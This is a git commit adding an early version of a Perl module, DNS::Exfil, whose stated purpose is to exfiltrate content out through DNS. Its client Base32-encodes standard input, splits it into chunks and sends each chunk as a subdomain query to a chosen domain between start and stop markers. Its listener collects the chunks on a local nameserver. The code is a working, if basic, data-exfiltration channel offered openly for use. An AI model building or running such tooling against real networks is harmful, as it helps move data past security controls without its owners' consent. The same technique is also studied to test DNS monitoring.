474866a0c9d019cde7b8766f40dd9e741a4f590e
Greg Foletta <greg@foletta.org>
2019-03-25 10:24:22 +1100

    Initial working client and listener

---
+++ README.md
@@ -0,0 +1,30 @@
+# NAME
+
+DNS::Exfil - Exfiltrate content out through DNS.
+
+# VERSION
+
+version 0.01
+
+# SYNOPSIS
+
+# DESCRIPTION
+
+# ERRORS 
+
+# METHODS
+
+## listener
+
+## client
+
+# AUTHOR
+
+Greg Foletta <greg@foletta.org>
+
+# COPYRIGHT AND LICENSE
+
+This software is copyright (c) 2019 by Greg Foletta.
+
+This is free software; you can redistribute it and/or modify it under
+the same terms as the Perl 5 programming language system itself.
--- lib/DNS/Exfil.pm
+++ lib/DNS/Exfil.pm
@@ -4,9 +4,13 @@ use strict;
 use warnings;
 use 5.010;
 
-# VERSION
-# PODNAME
-# ABSTRACT: new module
+use Net::DNS::Nameserver;
+use Net::DNS;
+use MIME::Base32;
+
+# VERSION: .1
+# PODNAME: DNS::Exfil
+# ABSTRACT: Exfiltrate content out through DNS.
 
 =encoding utf8
 
@@ -18,10 +22,59 @@ use 5.010;
 
 =head1 METHODS
 
-=head2 new
+=head2 listener
 
 =cut
 
+sub listener {
+    my %cmd_args = @_;
+
+    my @request_stack;
+    say "Listening...";
+    my $ns = Net::DNS::Nameserver->new(
+        LocalAddr => ['127.0.0.1'],
+        LocalPort => 8000,
+        ReplyHandler => sub { dns_worker(\@request_stack, @_) } 
+    );
+
+    use Data::Printer;
+    while (!$ns->loop_once(1)) {
+        p @request_stack;
+    }
+}
+
+sub dns_worker {
+    my $stack_r = shift;
+    my ( $qname, $qclass, $qtype, $peerhost, $query, $conn ) = @_;
+    say $qname;
+    my $base32 = [ split('\.', $qname) ]->[0];
+    push @{$stack_r}, $base32;
+}
+
+
+
+=head2 client
+
+=cut
+
+sub client {
+    my %cmdline_args = @_;
+    my $exfil_domain = $cmdline_args{domain};
+
+    say $exfil_domain;
+
+    while (<STDIN>) {
+        chomp;
+        say {*STDERR} "$_";
+        my @chunks = unpack('(A8)*', MIME::Base32::encode($_));
+
+        rr("start-exfil.$exfil_domain");
+        for my $chunk (@chunks) {
+            my $responnse = rr("$chunk.$exfil_domain");
+        }
+        rr("stop-exfil.$exfil_domain");
+    }
+}
 
 
 1;
